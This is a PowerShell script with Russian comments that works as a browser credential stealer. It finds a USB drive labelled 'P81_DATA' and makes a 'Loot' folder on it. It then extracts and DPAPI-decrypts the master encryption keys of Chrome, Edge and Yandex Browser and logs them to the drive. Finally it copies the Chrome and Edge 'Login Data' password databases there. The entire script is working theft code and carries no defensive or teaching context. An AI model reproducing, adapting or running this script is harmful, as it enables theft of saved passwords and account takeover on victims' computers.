# 1. Поиск флешки
$usb = (gwmi Win32_Volume | ? {$_.Label -eq 'P81_DATA'}).Name
if (!$usb) { exit }

$dest = New-Item -ItemType Directory -Path "$($usb)Loot\$(Get-Date -f mmss)" -Force
$log = "$($dest.FullName)\keys_ready.txt"

# Подгружаем криптографию
Add-Type -AssemblyName System.Security

$paths = @(
    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"},
    @{n="EDGE"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"},
    @{n="YANDEX"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Local State"}
)

foreach ($b in $paths) {
    if (Test-Path $b.p) {
        try {
            # 1. Достаем строку из JSON
            $json = Get-Content $b.p -Raw | ConvertFrom-Json
            $base64_enc_key = $json.os_crypt.encrypted_key
            
            # 2. Декодируем из Base64
            $raw_enc_key = [Convert]::FromBase64String($base64_enc_key)
            
            # 3. Убираем префикс 'DPAPI' (5 байт)
            $payload = $raw_enc_key[5..($raw_enc_key.Length - 1)]
            
            # 4. РАСШИФРОВКА (DPAPI)
            $decrypted_key = [System.Security.Cryptography.ProtectedData]::Unprotect($payload, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            
            # 5. Превращаем обратно в Base64 для лога
            $final_key = [Convert]::ToBase64String($decrypted_key)
            
            "[$($b.n)] READY_KEY: $final_key" | Out-File $log -Append
        } catch {
            "[$($b.n)] ERROR: $($_.Exception.Message)" | Out-File $log -Append
        }
    }
}

# Копируем базы (упрощенно)
cp $env:LOCALAPPDATA\Google\Chrome\'User Data'\Default\'Login Data' "$($dest.FullName)\CH_Logins.db" -ErrorAction Ignore
cp $env:LOCALAPPDATA\Microsoft\Edge\'User Data'\Default\'Login Data' "$($dest.FullName)\ED_Logins.db" -ErrorAction Ignore

exit
